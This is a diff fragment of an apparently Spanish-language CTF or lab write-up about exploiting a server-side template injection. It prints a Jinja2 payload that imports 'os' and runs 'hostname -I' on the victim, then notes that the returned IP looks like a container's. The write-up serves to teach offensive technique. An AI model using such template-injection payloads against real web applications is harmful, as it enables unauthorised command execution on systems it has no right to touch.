@@ -137,4 +137,4 @@ Eso quiere decir que somos root y podemos ejecutar comandos en la maquina victim
 Usaremos 
 `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('hostname -I').read() }}`
 
-Y nos muestra un IP que n
+Y nos muestra un IP que no es la de la maquina que estamos atacando y tiene  pinta de que es un contenedor
